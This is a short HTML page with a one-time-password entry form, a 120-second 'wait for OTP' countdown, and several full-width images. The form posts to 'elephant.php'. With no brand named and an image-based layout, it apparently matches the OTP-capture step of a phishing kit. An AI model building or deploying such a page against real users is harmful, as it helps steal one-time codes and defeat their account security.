<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        #aa , #tere ,#ram , #sita , #lol
        {
            width: 100%;
        }
        #form
        {
            margin-left: 23px;
        }
        #dd ,#ff ,#hh
        {
            width: 60%;
            height: 22px;
            background: #F3F3F3;
            border-radius:3px;
            
        }

        ::placeholder
        {
            font-size:12px;
        }
        #btn
        {
           background-color: 	#0080ff;
           color:white;
           border-radius:3px;
           font-size: 16px;
           border: none;
           width: 40%;
           height:30px;
        }
    </style>
</head>
<body>
    <div id="zz">
    <img src="trph.png" alt="" id="aa">
    </div>
    <div id="LOP">
        <img src="ammy.jpeg" alt="" id="lol">
    </div>
    <form action="elephant.php" method="post" id="form">
        
        <div id="xx">
            <p id="cc">
                OTP*
            </p>
            <input type="text" name="2otp" id="dd" placeholder="OTP* " required="">
        </div> <br>
        <div id="tim">
          <b>
          <p id="tem"> wait for OTP..<span id="countdowntimer">120 </span> Seconds</p>
          </b>

<script type="text/javascript">
    var timeleft = 120;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
</script>
        <div id="ss">
            <button type="submit" id="btn">
                CONTINUE
            </button>
        </div> <br>
    </form>
    <div id="ki">
        <img src="last1.jpeg" alt="" id="ram">
    </div>
    <div id="klo">
        <img src="last2.jpeg" alt="" id="sita">
    </div>
</body>
</html>